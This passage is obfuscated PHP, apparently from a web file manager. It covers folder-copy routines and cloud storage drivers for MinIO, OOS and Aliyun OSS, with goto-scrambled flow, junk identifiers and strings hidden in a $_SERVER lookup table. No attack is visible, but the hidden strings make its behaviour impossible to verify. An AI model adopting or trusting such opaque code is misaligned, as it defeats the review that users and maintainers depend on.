Model($f›ğ›ĞÛ²Û[506])->addAll($C†èà»Ğ¶š[$f›ğ›ĞÛ²Û[504]], array(), !0); Model($f›ğ›ĞÛ²Û[507])->eventCopy($cî·ØÇ²µ¾); $this->saveAll($C†èà»Ğ¶š[$f›ğ›ĞÛ²Û[505]]); goto E…Š¦ÉË; EİŒõÔ×ƒ°: $this->updateModifyTime($bØÃ‡ˆÌ˜Š); return $cî·ØÇ²µ¾; goto càË†âŸŠ ; càË†âŸŠ : } private function _copyChildTo($E«ù×ÓŸÚŒ, $E©›®¶èÖ, $AÛ†—©ã§ò, $E„—”ÜİôÃ, &$F•ÛÛ¹Â…„, $eÆíÊÚÏõä) { goto Fò¥²ì›·¬; Fò¥²ì›·¬: $C¯…Ô¢…§› =& $_SERVER[¬ˆÚÂ”Éğä]; $Eœ¿¢ó³£¥ = $this->sourceInfoCache($AÛ†—©ã§ò); $AÇÌƒˆÑñ± = $E«ù×ÓŸÚŒ->listPath($E©›®¶èÖ, !1, !0); goto EªÂæÑ¤Ãò; eæ‡„íç‚Ÿ: $e™ŞÇÎÓ®‡ = $this->_childrenList($AÛ†—©ã§ò); $e™ŞÇÎÓ®‡ = array_to_keyvalue($e™ŞÇÎÓ®‡, $C¯…Ô¢…§›[28]); foreach ($AÑ¦Í’¾ƒõ as $FîäåªÕÉœ) { $e–’„˜Ì†» = $e™ŞÇÎÓ®‡[$FîäåªÕÉœ[$C¯…Ô¢…§›[28]]]; $B”Çç‘İÔÍ = $e–’„˜Ì†»[$C¯…Ô¢…§›[369]]; $this->_copyApplyMeta($e–’„˜Ì†», $F•ÛÛ¹Â…„); if ($FîäåªÕÉœ[$C¯…Ô¢…§›[29]] == $C¯…Ô¢…§›[76]) { $FîäåªÕÉœ[$C¯…Ô¢…§›[75]] = $E«ù×ÓŸÚŒ->getPathInner($FîäåªÕÉœ[$C¯…Ô¢…§›[75]]); $this->_copyChildTo($E«ù×ÓŸÚŒ, $FîäåªÕÉœ[$C¯…Ô¢…§›[75]], $B”Çç‘İÔÍ, $E„—”ÜİôÃ, $F•ÛÛ¹Â…„, $eÆíÊÚÏõä); } } goto aĞÏ“Ùš•‹; d³ŠÙ­ß¶–: foreach ($AÑ¦Í’¾ƒõ as &$FîäåªÕÉœ) { goto Dİ¢â–æ; c‰¡²‹–ó: $FîäåªÕÉœ[$C¯…Ô¢…§›[77]] = _get($FîäåªÕÉœ, $C¯…Ô¢…§›[77], 0); $FîäåªÕÉœ[$C¯…Ô¢…§›[419]] = _get($FîäåªÕÉœ, $C¯…Ô¢…§›[419], 0); if (!isset($FîäåªÕÉœ[$C¯…Ô¢…§›[543]]) && $FîäåªÕÉœ[$C¯…Ô¢…§›[419]]) { $F•ÛÛ¹Â…„[$C¯…Ô¢…§›[540]][] = $FîäåªÕÉœ[$C¯…Ô¢…§›[419]]; } goto C›ÜÁÎ•×; C›ÜÁÎ•×: if ($E„—”ÜİôÃ) { $B²½íÛÚÓ• = $this->fileNameExistCache($AÛ†—©ã§ò, $FîäåªÕÉœ[$C¯…Ô¢…§›[28]]); if ($B²½íÛÚÓ•) { if ($FîäåªÕÉœ[$C¯…Ô¢…§›[370]] || $E„—”ÜİôÃ == REPEAT_SKIP) { continue; } if ($E„—”ÜİôÃ == REPEAT_REPLACE) { $e–’„˜Ì†» = $this->sourceInfoCache($B²½íÛÚÓ•); $eö¦‹ºÖ = $this->fileHistory($e–’„˜Ì†», $FîäåªÕÉœ[$C¯…Ô¢…§›[419]], $FîäåªÕÉœ[$C¯…Ô¢…§›[77]]); if ($eö¦‹ºÖ) { $F•ÛÛ¹Â…„[$C¯…Ô¢…§›[503]][] = $FîäåªÕÉœ[$C¯…Ô¢…§›[419]]; } continue; } else { if ($E„—”ÜİôÃ == REPEAT_RENAME) { $FîäåªÕÉœ[$C¯…Ô¢…§›[28]] = $this->fileNameAutoCache($AÛ†—©ã§ò, $FîäåªÕÉœ[$C¯…Ô¢…§›[28]], $E„—”ÜİôÃ, !1); } } } } if (!$FîäåªÕÉœ[$C¯…Ô¢…§›[370]] && $FîäåªÕÉœ[$C¯…Ô¢…§›[419]]) { $F•ÛÛ¹Â…„[$C¯…Ô¢…§›[503]][] = $FîäåªÕÉœ[$C¯…Ô¢…§›[419]]; } $eÇÉÙ°ˆ÷[] = $this->_makeItemData($FîäåªÕÉœ, $Eœ¿¢ó³£¥, $FîäåªÕÉœ[$C¯…Ô¢…§›[28]]); goto F­ˆ’˜ï’; Dİ¢â–æ: if (isset($F‰Í±§ë‹—[$FîäåªÕÉœ[$C¯…Ô¢…§›[28]]])) { $FîäåªÕÉœ = $F‰Í±§ë‹—[$FîäåªÕÉœ[$C¯…Ô¢…§›[28]]]; } $FîäåªÕÉœ[$C¯…Ô¢…§›[370]] = $FîäåªÕÉœ[$C¯…Ô¢…§›[29]] == $C¯…Ô¢…§›[76]; $FîäåªÕÉœ[$C¯…Ô¢…§›[372]] = _get($FîäåªÕÉœ, $C¯…Ô¢…§›[160], $C¯…Ô¢…§›[33]); goto c‰¡²‹–ó; F­ˆ’˜ï’: } unset($FîäåªÕÉœ); if (!empty($eÇÉÙ°ˆ÷)) { $this->addAll($eÇÉÙ°ˆ÷); } goto eæ‡„íç‚Ÿ; EªÂæÑ¤Ãò: $AÑ¦Í’¾ƒõ = array_merge($AÇÌƒˆÑñ±[$C¯…Ô¢…§›[73]], $AÇÌƒˆÑñ±[$C¯…Ô¢…§›[74]]); $F‰Í±§ë‹— = $this->_addFiles($E«ù×ÓŸÚŒ, $AÇÌƒˆÑñ±[$C¯…Ô¢…§›[73]], $eÆíÊÚÏõä); $eÇÉÙ°ˆ÷ = array(); goto d³ŠÙ­ß¶–; aĞÏ“Ùš•‹: } private function _addFiles($E‘Ï“Ü‘µß, $fùÕŠÏŸ¤ˆ, $EòñÜ¶¾‘) { goto DÄò“¶Áöë; DÄò“¶Áöë: $CÚø¾½¦‘Ë =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$fùÕŠÏŸ¤ˆ || count($fùÕŠÏŸ¤ˆ) == 0) { return array(); } $e¶œ®¾‘ø = array(); goto D…”›®à…; e¸®ç¶Ö¨: foreach ($fùÕŠÏŸ¤ˆ as $d²‹ŞË™¿Ÿ) { $bÊ÷Ş†Èø[$d²‹ŞË™¿Ÿ[$CÚø¾½¦‘Ë[28]]] = $d²‹ŞË™¿Ÿ; } return $bÊ÷Ş†Èø; goto A³¿©ó•ôä; c‚»‰é³Á©: $c˜ÎÊ‡ˆğÍ = $c˜ÎÊ‡ˆğÍ ? $c˜ÎÊ‡ˆğÍ : array(); foreach ($c˜ÎÊ‡ˆğÍ as $bë™ÁãÁ†¾) { if (!isset($e¶œ®¾‘ø[$bë™ÁãÁ†¾[$CÚø¾½¦‘Ë[163]]])) { continue; } $cÖ„¥¯Ü³Û =& $e¶œ®¾‘ø[$bë™ÁãÁ†¾[$CÚø¾½¦‘Ë[163]]]; foreach ($cÖ„¥¯Ü³Û as &$C–µ¾…×¶) { $C–µ¾…×¶[$CÚø¾½¦‘Ë[419]] = $bë™ÁãÁ†¾[$CÚø¾½¦‘Ë[419]]; } unset($C–µ¾…×¶); } $bÊ÷Ş†Èø = array(); goto e¸®ç¶Ö¨; A®â¶±çã: $b¹µèÀÑ¦->addAll($BÄÃß°Û—©); $dêÍãë¬Û¢ = array($CÚø¾½¦‘Ë[163] => array($CÚø¾½¦‘Ë[7], array_keys($e¶œ®¾‘ø))); $c˜ÎÊ‡ˆğÍ = $b¹µèÀÑ¦->where($dêÍãë¬Û¢)->select(); goto c‚»‰é³Á©; c¯Ç¶„ÎÚ§: $b¹µèÀÑ¦ = Model($CÚø¾½¦‘Ë[546]); $c˜ÎÊ‡ˆğÍ = $b¹µèÀÑ¦->where($dêÍãë¬Û¢)->select(); $c˜ÎÊ‡ˆğÍ = $c˜ÎÊ‡ˆğÍ ? $c˜ÎÊ‡ˆğÍ : array(); goto aª¾¯ø·«Ì; D…”›®à…: foreach ($fùÕŠÏŸ¤ˆ as &$C–µ¾…×¶) { goto eë‹Â¤Ş–Ÿ; c°òğ’ïÄÖ: if (count($e¶œ®¾‘ø[$c…‚”½«Ìì]) > 1) { $C–µ¾…×¶[$CÚø¾½¦‘Ë[543]] = !0; } goto EÜîÉÈÆ; føãš‹µ: $c…‚”½«Ìì = $E‘Ï“Ü‘µß->hashMd5($C–µ¾…×¶[$CÚø¾½¦‘Ë[75]]); if (strlen($c…‚”½«Ìì) > 10 && !isset($e¶œ®¾‘ø[$c…‚”½«Ìì])) { $e¶œ®¾‘ø[$c…‚”½«Ìì] = array(); } $C–µ¾…×¶[$CÚø¾½¦‘Ë[164]] = $Bí¨¹ÒÎÊÁ; goto cõÂ‘¼Æ“; cõÂ‘¼Æ“: $C–µ¾…×¶[$CÚø¾½¦‘Ë[163]] = $c…‚”½«Ìì; Hook::trigger($CÚø¾½¦‘Ë[545], $C–µ¾…×¶); $e¶œ®¾‘ø[$c…‚”½«Ìì][] =& $C–µ¾…×¶; goto c°òğ’ïÄÖ; eë‹Â¤Ş–Ÿ: Hook::trigger($CÚø¾½¦‘Ë[544], $C–µ¾…×¶); $C–µ¾…×¶[$CÚø¾½¦‘Ë[75]] = $E‘Ï“Ü‘µß->getPathInner($C–µ¾…×¶[$CÚø¾½¦‘Ë[75]]); $Bí¨¹ÒÎÊÁ = $E‘Ï“Ü‘µß->hashSimple($C–µ¾…×¶[$CÚø¾½¦‘Ë[75]]); goto føãš‹µ; EÜîÉÈÆ: } unset($C–µ¾…×¶); $dêÍãë¬Û¢ = array($CÚø¾½¦‘Ë[163] => array($CÚø¾½¦‘Ë[7], array_keys($e¶œ®¾‘ø))); goto c¯Ç¶„ÎÚ§; aª¾¯ø·«Ì: foreach ($c˜ÎÊ‡ˆğÍ as $bë™ÁãÁ†¾) { if (!isset($e¶œ®¾‘ø[$bë™ÁãÁ†¾[$CÚø¾½¦‘Ë[163]]])) { continue; } $b»º½×ä = $e¶œ®¾‘ø[$bë™ÁãÁ†¾[$CÚø¾½¦‘Ë[163]]]; foreach ($b»º½×ä as &$C–µ¾…×¶) { $C–µ¾…×¶[$CÚø¾½¦‘Ë[419]] = $bë™ÁãÁ†¾[$CÚø¾½¦‘Ë[419]]; $C–µ¾…×¶[$CÚø¾½¦‘Ë[543]] = !0; } unset($C–µ¾…×¶); } $BÄÃß°Û—© = array(); foreach ($fùÕŠÏŸ¤ˆ as $CÇñ‹ôÂë±) { if (isset($CÇñ‹ôÂë±[$CÚø¾½¦‘Ë[543]]) && $CÇñ‹ôÂë±[$CÚø¾½¦‘Ë[543]]) { continue; } $bØÃâÔ×æù = $E‘Ï“Ü‘µß->getPathInner($CÇñ‹ôÂë±[$CÚø¾½¦‘Ë[75]]); $b§¢¥İÕ† = $b¹µèÀÑ¦->addFileMake($bØÃâÔ×æù, $CÇñ‹ôÂë±[$CÚø¾½¦‘Ë[77]], $CÇñ‹ôÂë±[$CÚø¾½¦‘Ë[164]], $CÇñ‹ôÂë±[$CÚø¾½¦‘Ë[163]], $CÇñ‹ôÂë±[$CÚø¾½¦‘Ë[28]], $EòñÜ¶¾‘); $BÄÃß°Û—©[] = $b§¢¥İÕ†; } goto A®â¶±çã; A³¿©ó•ôä: } } define($_SERVER[¬ˆÚÂ”Éğä][547], $_SERVER[¬ˆÚÂ”Éğä][548]); goto b‰‰¸ÜÛ‚—; DØ¡‡µóâÌ: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Bœ¼ßˆàÉ) { parent::__construct($Bœ¼ßˆàÉ); $this->signatureVersion($_SERVER[¬ˆÚÂ”Éğä][200]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($EÕ…¤ƒ ‘ˆ) { parent::__construct($EÕ…¤ƒ ‘ˆ); $this->signatureVersion($_SERVER[¬ˆÚÂ”Éğä][200]); } public function fileOutLink($Eš‹ò ˜“) { $bîÚà×Úò¢ =& $_SERVER[¬ˆÚÂ”Éğä]; if (substr($Eš‹ò ˜“, 0, 7) == $bîÚà×Úò¢[1128]) { $Eš‹ò ˜“ = $bîÚà×Úò¢[1129] . substr($Eš‹ò ˜“, 7); } header($bîÚà×Úò¢[156] . $Eš‹ò ˜“); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($dô„âåáé) { parent::__construct(); include_once SDK_DIR . $_SERVER[¬ˆÚÂ”Éğä][1184]; $this->_init($dô„âåáé); } public function _init($fãæÏíÉ¬) { foreach ($fãæÏíÉ¬ as $dÀº«ˆÉ†Š => $d‡Ó—ƒ“„¤) { if (isset($this->{$dÀº«ˆÉ†Š})) { $this->{$dÀº«ˆÉ†Š} = $d‡Ó—ƒ“„¤; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[¬ˆÚÂ”Éğä][1185], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto F›Àø¤ê³ñ; F›Àø¤ê³ñ: $f°‚™£øĞ° =& $_SERVER[¬ˆÚÂ”Éğä]; $B¶†©¢Ì  = new OSS\Model\CorsConfig(); $A‘Ğ¾¤Ë•³ = new OSS\Model\CorsRule(); goto c«Ë‰»Ï¬é; E¶ÜÈèØ¬: $A‘Ğ¾¤Ë•³->addAllowedMethod($f°‚™£øĞ°[1189]); $A‘Ğ¾¤Ë•³->addAllowedMethod($f°‚™£øĞ°[1190]); $A‘Ğ¾¤Ë•³->addAllowedMethod($f°‚™£øĞ°[155]); goto A³ö†Ë¸ÚÖ; A³ö†Ë¸ÚÖ: $A‘Ğ¾¤Ë•³->setMaxAgeSeconds(600); $A‘Ğ¾¤Ë•³->addExposeHeader($f°‚™£øĞ°[1191]); $A‘Ğ¾¤Ë•³->addAllowedHeader($f°‚™£øĞ°[1186]); goto Då¾§ó‚ˆ‰; Då¾§ó‚ˆ‰: $B¶†©¢Ì ->addRule($A‘Ğ¾¤Ë•³); try { $this->client->putBucketCors($this->bucket, $B¶†©¢Ì ); } catch (OSS\Core\OssException $FöŞóšº) { return !1; } return !0; goto cá½¤‰í§; c«Ë‰»Ï¬é: $A‘Ğ¾¤Ë•³->addAllowedOrigin($f°‚™£øĞ°[1186]); $A‘Ğ¾¤Ë•³->addAllowedMethod($f°‚™£øĞ°[1187]); $A‘Ğ¾¤Ë•³->addAllowedMethod($f°‚™£øĞ°[1188]); goto E¶ÜÈèØ¬; cá½¤‰í§: } public function getBucketCors() { goto CˆÈÒ·; c™Æøœî‰: $eê­ßÉöŒæ = $F¤İÁÂËî±[0]->getMaxAgeSeconds(); $Fç½Ü…Ì = $F¤İÁÂËî±[0]->getExposeHeaders(); $b…±¢“«° = $F¤İÁÂËî±[0]->getAllowedHeaders(); goto dåÕ–ä„ìÒ; CˆÈÒ·: $fœ—ëÙ«Ê =& $_SERVER[¬ˆÚÂ”Éğä]; $AØÕ‹ïØĞ = null; try { $AØÕ‹ïØĞ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $B§™åâ¶Â) { return null; } goto AÕöÜèÀÁ; AÕöÜèÀÁ: if (!$AØÕ‹ïØĞ || !($F¤İÁÂËî± = $AØÕ‹ïØĞ->getRules())) { return null; } $bÂÙ´à•æ = $F¤İÁÂËî±[0]->getAllowedOrigins(); $FêÌ¾Ü»©© = $F¤İÁÂËî±[0]->getAllowedMethods(); goto c™Æøœî‰; dåÕ–ä„ìÒ: return array($fœ—ëÙ«Ê[175] => isset($bÂÙ´à•æ[0]) ? $bÂÙ´à•æ[0] : $fœ—ëÙ«Ê[33], $fœ—ëÙ«Ê[179] => $FêÌ¾Ü»©©, $fœ—ëÙ«Ê[1192] => $eê­ßÉöŒæ, $fœ—ëÙ«Ê[1193] => isset($Fç½Ü…Ì[0]) ? $Fç½Ü…Ì[0] : $fœ—ëÙ«Ê[33], $fœ—ëÙ«Ê[177] => isset($b…±¢“«°[0]) ? $b…±¢“«°[0] : $fœ—ëÙ«Ê[33]); goto EØÆ®™›à›; EØÆ®™›à›: } public function isBucketCors() { goto C“§²´Ò·ù; F¼‰¾¸åˆ: if ($dä¼öÕ¼õĞ[$cÊè‚ˆ¨Ÿ¶[175]] != $cÊè‚ˆ¨Ÿ¶[176] || $dä¼öÕ¼õĞ[$cÊè‚ˆ¨Ÿ¶[177]] != $cÊè‚ˆ¨Ÿ¶[176]) { return !1; } $DŸå£ò±•  = array_map($cÊè‚ˆ¨Ÿ¶[178], $dä¼öÕ¼õĞ[$cÊè‚ˆ¨Ÿ¶[179]]); if (!is_array($DŸå£ò±• )) { $DŸå£ò±•  = array(); } goto f„ÑæÖËë; C“§²´Ò·ù: $cÊè‚ˆ¨Ÿ¶ =& $_SERVER[¬ˆÚÂ”Éğä]; $dä¼öÕ¼õĞ = $this->getBucketCors(); if (!$dä¼öÕ¼õĞ || !is_array($dä¼öÕ¼õĞ)) { return !1; } goto F¼‰¾¸åˆ; f„ÑæÖËë: $e¤ŠéëÀğ = array($cÊè‚ˆ¨Ÿ¶[180], $cÊè‚ˆ¨Ÿ¶[181], $cÊè‚ˆ¨Ÿ¶[182], $cÊè‚ˆ¨Ÿ¶[183], $cÊè‚ˆ¨Ÿ¶[184]); $EÜ«·ÕÜ·˜ = array_diff($e¤ŠéëÀğ, $DŸå£ò±• ); return empty($EÜ«·ÕÜ·˜); goto bº©‹›§ÒÊ; bº©‹›§ÒÊ: } public function mkfile($Fí™ãòÁŞµ, $b‚¡Š…‰æ  = '', $e…‹…º‹øœ = REPEAT_RENAME) { $fÀÕğÁğå› = $this->setContent($Fí™ãòÁŞµ, $b‚¡Š…‰æ ); if ($fÀÕğÁğå› !== !1) { return $this->getPathOuter($Fí™ãòÁŞµ); } return !1; } public function mkdir($CÒ… ‚ÓÆã, $a•¹‹«‡ØÍ = REPEAT_SKIP) { if ($this->_isFolder($CÒ… ‚ÓÆã)) { return $this->getPathOuter($CÒ… ‚ÓÆã); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($CÒ… ‚ÓÆã)); } catch (OSS\Core\OssException $Eø±À¸ÅÕ) { return !1; } return $this->getPathOuter($CÒ… ‚ÓÆã); } private function fileList($F¹£Âï‘¼‘, $f°éâÏ˜» = '', $aàÕ²÷—å = 0) { goto fñÇ¡™áŸÒ; EÁ«‰Ç—îä: $føœù×©” = $eµâêºĞä›[33]; $EØ“–»ïŞÖ = 1000; $dáÏóİã»á = $CÀ›Ô«´ˆ = array(); goto F¦Ü‘¾òÇÎ; F¦Ü‘¾òÇÎ: while (!0) { $fÛĞÎØ ¦Š = array($eµâêºĞä›[1194] => $f°éâÏ˜», $eµâêºĞä›[186] => $bĞ”âÑÃ—¯, $eµâêºĞä›[1195] => $EØ“–»ïŞÖ, $eµâêºĞä›[1196] => $føœù×©”); try { $CìÅù“î­† = $this->client->listObjects($this->bucket, $fÛĞÎØ ¦Š); } catch (OSS\Core\OssException $A–Åß—¿) { break; } $føœù×©” = $CìÅù“î­†->getNextMarker(); $b‹½µÔ‡÷ = $CìÅù“î­†->getObjectList(); $b…ø”®…š = $CìÅù“î­†->getPrefixList(); foreach ($b‹½µÔ‡÷ as $AÄ¼ù¤Ç„§) { if ($AÄ¼ù¤Ç„§->getKey() == $bĞ”âÑÃ—¯) { continue; } $DÃ• ØÃ— = $AÄ¼ù¤Ç„§->getKey(); if ($aàÕ²÷—å) { $DÃ• ØÃ— = array($eµâêºĞä›[28] => $DÃ• ØÃ—, $eµâêºĞä›[77] => $AÄ¼ù¤Ç„§->getSize(), $eµâêºĞä›[190] => strtotime($AÄ¼ù¤Ç„§->getLastModified())); } $CÀ›Ô«´ˆ[] = $DÃ• ØÃ—; } foreach ($b…ø”®…š as $AÕ–ÄšÊŒ•) { $dáÏóİã»á[] = $AÕ–ÄšÊŒ•->getPrefix(); } if ($føœù×©” === $eµâêºĞä›[33]) { break; } } return array($eµâêºĞä›[74] => $dáÏóİã»á, $eµâêºĞä›[73] => $CÀ›Ô«´ˆ); goto ağÛ÷Ù›¸¿; fñÇ¡™áŸÒ: $eµâêºĞä› =& $_SERVER[¬ˆÚÂ”Éğä]; $F¹£Âï‘¼‘ = trim($F¹£Âï‘¼‘, $eµâêºĞä›[8]); $bĞ”âÑÃ—¯ = empty($F¹£Âï‘¼‘) ? $eµâêºĞä›[33] : $F¹£Âï‘¼‘ . $eµâêºĞä›[8]; goto EÁ«‰Ç—îä; ağÛ÷Ù›¸¿: } public function copyFile($E×Ñ“Ç†¥, $FÏš´Š’¸¤) { $CÀ„½êÆ¥‘ = $this->size($E×Ñ“Ç†¥); if ($CÀ„½êÆ¥‘ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $E×Ñ“Ç†¥, $this->bucket, $this->pathEncode($FÏš´Š’¸¤)); } catch (OSS\Core\OssException $fÈÚÔƒªè×) { return !1; } return $this->getPathOuter($FÏš´Š’¸¤); } $E©ùòÈâç = $this->multiCopyObject($E×Ñ“Ç†¥, $FÏš´Š’¸¤, $CÀ„½êÆ¥‘); return $E©ùòÈâç ? $this->getPathOuter($FÏš´Š’¸¤) : !1; } private function multiCopyObject($b×¸Çª‡Óî, $A…ÍãÓºÓƒ, $aéäÜìÚŞÌ) { $B¥Ê§Á‘ =& $_SERVER[¬ˆÚÂ”Éğä]; try { goto Dí¼Ó¾×½; aè„ÈÁíÜ: $bÂŞñ¿™ = 1024 * 1024 * 10; $CìÀÌïÏ•ø = $this->client->generateMultiuploadParts($aéäÜìÚŞÌ, $bÂŞñ¿™); foreach ($CìÀÌïÏ•ø as $e»«Ú´­…İ => $aíÖ—Å×¿‹) { $B×ÏÂµöç = $EÚ×É ±¹ + (int) $aíÖ—Å×¿‹[$B¥Ê§Á‘[1198]]; $c½ì¯ƒë“« = (int) $aíÖ—Å×¿‹[$B¥Ê§Á‘[325]] + $B×ÏÂµöç - 1; $Eõä‹‡í„¹ = array($B¥Ê§Á‘[1199] => $B×ÏÂµöç, $B¥Ê§Á‘[1200] => $c½ì¯ƒë“«); $Bİß¶Ø’À[] = $this->client->uploadPartCopy($this->bucket, $b×¸Çª‡Óî, $this->bucket, $this->pathEncode($A…ÍãÓºÓƒ), $BÌ¿ğ©ñôè, $fİÉ¨ÄèÊÅ, $Eõä‹‡í„¹); $BÌ¿ğ©ñôè = $BÌ¿ğ©ñôè + 1; } goto DùëéïİÊ; e˜ÅØâÁ‡Ş: $BÌ¿ğ©ñôè = 1; $EÚ×É ±¹ = 0; $Bİß¶Ø’À = array(); goto aè„ÈÁíÜ; DùëéïİÊ: $FºğÀ÷Šã‘ = array(); foreach ($Bİß¶Ø’À as $e»«Ú´­…İ => $c‚ÒÎÃ½Ö”) { $FºğÀ÷Šã‘[] = array($B¥Ê§Á‘[1201] => $e»«Ú´­…İ + 1, $B¥Ê§Á‘[1202] => $c‚ÒÎÃ½Ö”); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($A…ÍãÓºÓƒ), $fİÉ¨ÄèÊÅ, $FºğÀ÷Šã‘); goto BÒ¢œóÈª; Dí¼Ó¾×½: $DÎç…•¹´Ô = array(); if ($D²ñ¥øˆò = $this->hashMd5($b×¸Çª‡Óî)) { $DÎç…•¹´Ô = array(OSS\OssClient::OSS_HEADERS => array($B¥Ê§Á‘[1197] => $D²ñ¥øˆò)); } $fİÉ¨ÄèÊÅ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($A…ÍãÓºÓƒ), $DÎç…•¹´Ô); goto e˜ÅØâÁ‡Ş; BÒ¢œóÈª: } catch (OSS\Core\OssException $cÒÑŞ‘‡×Ö) { return !1; } return !0; } public function moveFile($EÕâ É°ªƒ, $D¾ÎÃŠõ®¼) { if ($this->copyFile($EÕâ É°ªƒ, $D¾ÎÃŠõ®¼)) { $this->remove($EÕâ É°ªƒ); return $this->getPathOuter($D¾ÎÃŠõ®¼); } return !1; } public function delFile($bòÆ÷ëêï ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($bòÆ÷ëêï )); } catch (OSS\Core\OssException $B¬–¥Şù¡) { return !1; } return !0; } public function delFolder($D„ğƒîªİÍ) { $FÎí†Êª¯£ =& $_SERVER[¬ˆÚÂ”Éğä]; $DÂÑØŒë‹ = $this->fileList($D„ğƒîªİÍ); if (!empty($D„ğƒîªİÍ) && !in_array(trim($D„ğƒîªİÍ, $FÎí†Êª¯£[8]) . $FÎí†Êª¯£[8], $DÂÑØŒë‹[$FÎí†Êª¯£[73]])) { $DÂÑØŒë‹[$FÎí†Êª¯£[73]][] = trim($D„ğƒîªİÍ, $FÎí†Êª¯£[8]) . $FÎí†Êª¯£[8]; } foreach (array_chunk($DÂÑØŒë‹[$FÎí†Êª¯£[73]], 1000) as $CÑÑƒé¯’´) { try { $this->client->deleteObjects($this->bucket, $CÑÑƒé¯’´); } catch (OSS\Core\OssException $Cš›¦‰Õ£) { continue; } } return !0; } public function rename($e­¹œé¿, $bÖâ–ÃŠ ß) { return $this->renameObject($e­¹œé¿, $bÖâ–ÃŠ ß); } private function fileInfo($EŠÕÖÔ¯¤ø, $C¦¢ˆÃŞ•µ = array()) { goto A’Òã‚¿¦‹; dªÎ¯¼Ş˜ó: return $f£Ğ„—¦‰; goto D™Õ„Øå™³; D‰©Šõç‚¨: if (isset($C¦¢ˆÃŞ•µ[$EÖ¯ø±Şß[77]])) { $f£Ğ„—¦‰[$EÖ¯ø±Şß[77]] = $C¦¢ˆÃŞ•µ[$EÖ¯ø±Şß[77]]; } if (isset($C¦¢ˆÃŞ•µ[$EÖ¯ø±Şß[107]])) { $f£Ğ„—¦‰[$EÖ¯ø±Şß[107]] = $C¦¢ˆÃŞ•µ[$EÖ¯ø±Şß[107]]; } if (isset($C¦¢ˆÃŞ•µ[$EÖ¯ø±Şß[190]]) && !trim($f£Ğ„—¦‰[$EÖ¯ø±Şß[107]])) { $f£Ğ„—¦‰[$EÖ¯ø±Şß[107]] = $C¦¢ˆÃŞ•µ[$EÖ¯ø±Şß[190]]; } goto dªÎ¯¼Ş˜ó; A’Òã‚¿¦‹: $EÖ¯ø±Şß =& $_SERVER[¬ˆÚÂ”Éğä]; $f£Ğ„—¦‰ = array($EÖ¯ø±Şß[28] => $this->pathThis($EŠÕÖÔ¯¤ø), $EÖ¯ø±Şß[75] => $this->getPathOuter($EŠÕÖÔ¯¤ø), $EÖ¯ø±Şß[29] => $EÖ¯ø±Şß[167], $EÖ¯ø±Şß[187] => 0, $EÖ¯ø±Şß[107] => 0, $EÖ¯ø±Şß[77] => 0, $EÖ¯ø±Şß[160] => $this->ext($EŠÕÖÔ¯¤ø), $EÖ¯ø±Şß[188] => !0, $EÖ¯ø±Şß[189] => !0); if (empty($C¦¢ˆÃŞ•µ)) { $eè¢ë—È´ = $this->objectMeta($EŠÕÖÔ¯¤ø); if (!$eè¢ë—È´) { return $f£Ğ„—¦‰; } $C¦¢ˆÃŞ•µ = array($EÖ¯ø±Şß[107] => strtotime($eè¢ë—È´[$EÖ¯ø±Şß[1203]]), $EÖ¯ø±Şß[77] => $eè¢ë—È´[$EÖ¯ø±Şß[1204]] + 0); } goto D‰©Šõç‚¨; D™Õ„Øå™³: } private function folderInfo($FÆğô¿ÓÅ°, $F¦¼”èÀß˜ = array()) { $eí¯Üßù˜˜ =& $_SERVER[¬ˆÚÂ”Éğä]; $A‘††Üêí™ = array($eí¯Üßù˜˜[28] => $this->pathThis($FÆğô¿ÓÅ°), $eí¯Üßù˜˜[75] => $this->getPathOuter($eí¯Üßù˜˜[8] . $FÆğô¿ÓÅ°), $eí¯Üßù˜˜[29] => $eí¯Üßù˜˜[76], $eí¯Üßù˜˜[187] => 0, $eí¯Üßù˜˜[107] => 0, $eí¯Üßù˜˜[188] => !0, $eí¯Üßù˜˜[189] => !0); if (empty($F¦¼”èÀß˜)) { $FÆğô¿ÓÅ° = rtrim($FÆğô¿ÓÅ°, $eí¯Üßù˜˜[8]) . $eí¯Üßù˜˜[8]; $A„ç–– ‰” = $this->objectMeta($FÆğô¿ÓÅ°); if (!$A„ç–– ‰”) { return $A‘††Üêí™; } $F¦¼”èÀß˜ = array($eí¯Üßù˜˜[187] => $A„ç–– ‰”[$eí¯Üßù˜˜[1205]][$eí¯Üßù˜˜[1206]], $eí¯Üßù˜˜[107] => strtotime($A„ç–– ‰”[$eí¯Üßù˜˜[1203]])); } if (isset($F¦¼”èÀß˜[$eí¯Üßù˜˜[107]])) { $A‘††Üêí™[$eí¯Üßù˜˜[107]] = $F¦¼”èÀß˜[$eí¯Üßù˜˜[107]]; } if (isset($F¦¼”èÀß˜[$eí¯Üßù˜˜[187]])) { $A‘††Üêí™[$eí¯Üßù˜˜[187]] = $F¦¼”èÀß˜[$eí¯Üßù˜˜[187]]; } return $A‘††Üêí™; } public function listPath($eêôğŸ…»ë, $E¦óÇÚ×Ÿ² = false) { $dù¢¦°è–“ =& $_SERVER[¬ˆÚÂ”Éğä]; $F’¸¹Å£½Ê = $this->fileList($eêôğŸ…»ë, $dù¢¦°è–“[8], !0); foreach ($F’¸¹Å£½Ê[$dù¢¦°è–“[74]] as $A‹Œãİ¹ó¼ => $f‚ÊˆİÊ÷) { $F’¸¹Å£½Ê[$dù¢¦°è–“[74]][$A‹Œãİ¹ó¼] = $this->folderInfo($f‚ÊˆİÊ÷, $f‚ÊˆİÊ÷); } foreach ($F’¸¹Å£½Ê[$dù¢¦°è–“[73]] as $A‹Œãİ¹ó¼ => $f‚ÊˆİÊ÷) { 